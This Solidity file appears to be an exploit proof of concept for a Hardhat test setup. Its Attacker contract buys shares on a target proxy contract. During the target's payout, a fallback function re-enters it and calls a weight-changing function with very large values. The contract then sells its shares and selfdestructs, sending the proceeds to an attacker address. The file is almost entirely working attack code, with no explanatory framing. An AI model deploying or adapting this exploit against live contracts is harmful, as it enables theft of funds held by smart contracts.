// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract Attacker {
    address immutable targetProxyContract;
    address payable immutable attacker;
    bool attackSuccess;

    constructor(address _target, address payable _recipient) payable {
        targetProxyContract = _target;
        attacker = _recipient;
    }

    function destroyContract(address payable _recipient) internal {
        selfdestruct(_recipient);
    }

    function sellShares() internal {
        bytes memory sellSharesData = abi.encodeWithSelector(
            bytes4(0xb51d0534),
            address(this),
            1
        );
        (bool success, ) = address(targetProxyContract).call(sellSharesData);
        console.log("sellShares", success);
    }

    function attack() public payable {
        bytes memory buySharesData = abi.encodeWithSelector(
            bytes4(0xe9ccf3a3),
            address(this),
            1,
            address(this)
        );
        (bool success, ) = address(targetProxyContract).call{value: msg.value}(
            buySharesData
        );
        console.log("attack", success);
        if (success) {
            sellShares();
            destroyContract(attacker);
        }
    }

    fallback() external payable {
        bytes memory changeWeightData = abi.encodeWithSelector(
            bytes4(0x5632b2e4),
            91000000000,
            91000000000,
            91000000000,
            91000000000
        );
        (bool success, ) = address(targetProxyContract).call(changeWeightData);
        console.log("fallback", success);
    }
}
